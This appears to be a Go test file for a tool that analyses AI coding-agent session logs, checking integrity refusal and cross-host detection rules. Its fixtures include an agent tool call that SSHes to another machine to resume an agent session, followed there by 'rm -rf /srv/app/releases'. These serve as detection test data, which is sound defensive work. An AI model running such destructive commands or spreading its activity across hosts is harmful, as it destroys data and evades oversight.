	// graph, its edges and its findings are marked
	fail := func(p string) Integrity {
		if p == b {
			return Integrity{Result: "FAILED", Signature: "none", Problems: []string{"blob hash mismatch"}}
		}
		return Integrity{Result: "VERIFIED", Signature: "none"}
	}
	var re *RefusedError
	if _, err := Run([]string{a, b}, Options{Graph: true, Verify: fail}); !errors.As(err, &re) {
		t.Fatalf("unverified package not refused: %v", err)
	}
	rep, err = Run([]string{a, b}, Options{Graph: true, Verify: fail, AllowUnverified: true})
	if err != nil {
		t.Fatal(err)
	}
	g = rep.Graph
	if !g.Unverified || !g.Cases[1].Unverified || g.Cases[0].Unverified {
		t.Fatalf("unverified case not marked: %+v", g.Cases)
	}
	for _, n := range g.Nodes {
		if (n.Case == "C2") != n.Unverified {
			t.Fatalf("node marking: %+v", n)
		}
	}
	for _, f := range g.Findings {
		if !f.Unverified || f.Confidence != "LOW" {
			t.Fatalf("finding from an unverified case not marked: %+v", f)
		}
	}
}

// TestCrossCaseFindingIDs pins the rule IDs of the two cross-case
// findings and checks each is raised by its positive scenario.
func TestCrossCaseFindingIDs(t *testing.T) {
	if RuleCrossHostActivity != "AGENT_CROSS_HOST_ACTIVITY" || RuleCrossHostPropagation != "CHAIN_CROSS_HOST_AGENT_PROPAGATION" {
		t.Fatal("cross-case rule IDs changed")
	}
	g := BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidP, schema.EventHumanPrompt, 0),
			gev(sidP, schema.EventToolCall, 5, cmd(`ssh devbox "claude --resume `+sidS+` -p go"`))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 6), gev(sidS, schema.EventToolCall, 7, cmd("rm -rf /srv/app/releases"))),
	}, GraphOptions{})
	if len(findings(g, "CHAIN_CROSS_HOST_AGENT_PROPAGATION")) != 1 {
		t.Fatalf("propagation: %+v", g.Findings)
	}
	g = BuildGraph([]GraphCase{
		gcase("C1", "laptop", gev(sidS, schema.EventHumanPrompt, 0), gev(sidS, schema.EventToolCall, 1, cmd("ls"))),
		gcase("C2", "devbox", gev(sidS, schema.EventHumanPrompt, 30), gev(sidS, schema.EventToolCall, 31, cmd("make test"))),
	}, GraphOptions{})
	if len(findings(g, "AGENT_CROSS_HOST_ACTIVITY")) != 1 {
		t.Fatalf("cross-host activity: %+v", g.Findings)
	}
}
